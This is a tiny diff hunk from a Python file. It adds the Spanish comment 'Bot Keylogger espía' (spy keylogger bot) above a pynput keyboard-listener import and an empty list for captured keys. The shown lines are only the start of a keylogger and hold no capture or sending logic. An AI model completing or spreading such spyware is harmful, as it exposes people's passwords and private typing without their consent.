@@ -1,3 +1,5 @@
+#Bot Keylogger espía
+
 from pynput.keyboard import Key, Listener
 
 keys = []
